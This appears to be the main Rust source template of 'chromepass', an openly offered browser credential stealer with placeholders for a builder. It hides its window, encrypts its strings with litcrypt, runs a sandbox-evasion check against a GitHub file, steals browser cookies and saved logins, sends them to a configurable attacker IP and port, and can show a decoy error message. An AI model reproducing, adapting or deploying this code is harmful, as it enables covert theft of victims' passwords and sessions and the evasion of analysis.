#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod email;
mod robber;
use litcrypt::{lc, use_litcrypt};
use std::ffi::CString;
use user32::MessageBoxA;

use_litcrypt!("<<SECRET_KEY>>");

fn main() -> () {
    let error: bool = <<ERROR_BOOL>>;
    let cookie_bool = <<COOKIES_BOOL>>;
    let login_bool = <<LOGIN_BOOL>>;
    let email_bool = <<EMAIL_BOOL>>;
    let error_message = r#"<<ERROR_MESSAGE>>"#;
    let sandbox_internet = <<SANDBOX>>;
    if sandbox_internet {request_data();}
    let username = "<<USER_NAME>>";
    let password = "<<PASSWORD>>";
    let _ = browser::run_robber(cookie_bool, login_bool, &lc!("http://<<IP_ADDRESS>>:<<PORT>>"), email_bool, username, password);
    if error {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, ()> {
    let title = CString::new("Error!").unwrap();
    let message = CString::new(error_message).unwrap();
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}

pub fn request_data() -> () {
    let url = lc!("https://raw.githubusercontent.com/darkarp/chromepass/master/.github/ISSUE_TEMPLATE/bug_report.md");
    let check_data = lc!("Steps to reproduce the behavior");
    let client = reqwest::blocking::Client::new();
    let url: reqwest::Url = url.parse().unwrap();
    let resp = client.get(url).send().unwrap();
    if !(resp.text().unwrap().contains(&check_data)) {
        std::process::exit(0);
    }
}